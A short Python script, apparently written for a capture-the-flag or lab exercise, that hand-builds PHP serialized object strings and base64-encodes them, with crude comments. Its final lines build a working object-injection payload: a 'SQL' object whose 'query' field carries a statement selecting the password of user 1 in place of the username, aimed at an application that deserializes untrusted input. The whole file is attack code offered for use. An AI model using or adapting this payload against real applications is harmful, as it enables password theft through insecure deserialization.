# a nice lil function to serialise shit for us
import base64


def cereal(objName,*args):
	l = len(args)
	if l%2 != 0:
		raise Exception("Missing value for paramater '%s'"%args[-1])
	l = int(l/2)
	fields = []
	t = True
	for f in args:
		if t:
			fields.append("s:%d:\"%s\""%(len(f),f))
		else:
			if type(f) is int:
				fields.append("i:%d"%f)
			elif type(f) is str:
				fields.append("s:%d:\"%s\""%(len(f),f))
			else:
				raise Exception("I just serialise ints and strings dickhead")
		t = not t
	fields = ";".join(fields)
	res = "O:%d:\"%s\":%d:{%s;}"%(len(objName),objName,l,fields)
	return (res,base64.b64encode(bytes(res, 'utf-8')))

payload = "SELECT password AS username FROM users WHERE id=1"
res = cereal("SQL","query",payload)
print(res[0])
print(res[1])

